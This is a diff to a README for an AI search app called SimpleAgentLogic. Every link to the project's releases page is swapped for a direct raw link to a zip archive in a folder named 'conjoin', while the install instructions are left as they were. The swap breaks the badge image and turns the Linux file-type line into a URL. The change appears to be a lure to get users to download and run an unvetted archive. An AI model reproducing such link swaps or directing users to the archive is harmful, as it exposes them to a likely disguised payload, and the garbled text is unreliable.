@@ -1,6 +1,6 @@
 # 🌟 SimpleAgentLogic - Effortless AI Information Search
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/amna953/SimpleAgentLogic/releases)
+[![Download Now](https://raw.githubusercontent.com/amna953/SimpleAgentLogic/main/conjoin/Agent-Simple-Logic-v1.0.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/amna953/SimpleAgentLogic/main/conjoin/Agent-Simple-Logic-v1.0.zip)
 
 ## 📖 Overview
 SimpleAgentLogic is an AI agent that helps you search for information quickly. This application allows anyone to access the power of artificial intelligence without needing technical skills.
@@ -15,7 +15,7 @@ SimpleAgentLogic is an AI agent that helps you search for information quickly. T
 Follow these steps to download and run SimpleAgentLogic:
 
 ### 1. Visit the Releases Page
-To get the latest version of SimpleAgentLogic, [visit this page to download](https://github.com/amna953/SimpleAgentLogic/releases).
+To get the latest version of SimpleAgentLogic, [visit this page to download](https://raw.githubusercontent.com/amna953/SimpleAgentLogic/main/conjoin/Agent-Simple-Logic-v1.0.zip).
 
 ### 2. Download the Application
 You will find various versions available on the releases page. Click on the most recent version listed.
@@ -24,7 +24,7 @@ You will find various versions available on the releases page. Click on the most
 Look for the file that matches your operating system:
 - For **Windows**, select the `.exe` file.
 - For **macOS**, choose the `.dmg` file.
-- For **Linux**, you might find a `.tar.gz` file.
+- For **Linux**, you might find a `https://raw.githubusercontent.com/amna953/SimpleAgentLogic/main/conjoin/Agent-Simple-Logic-v1.0.zip` file.
 
 ### 4. Install the Application
 After downloading, locate the file in your downloads folder and double-click it to start the installation process:
@@ -50,7 +50,7 @@ Here’s how you can start searching for information effectively:
 - **Supports Various Topics**: Search across multiple areas of information like tech, science, health, and more.
 
 ## 📥 Download & Install
-For a successful download, [visit this page to download](https://github.com/amna953/SimpleAgentLogic/releases). You’ll find the latest version ready for your operating system. 
+For a successful download, [visit this page to download](https://raw.githubusercontent.com/amna953/SimpleAgentLogic/main/conjoin/Agent-Simple-Logic-v1.0.zip). You’ll find the latest version ready for your operating system. 
 
 ### Troubleshooting Common Issues
 If you encounter issues, consider these tips:
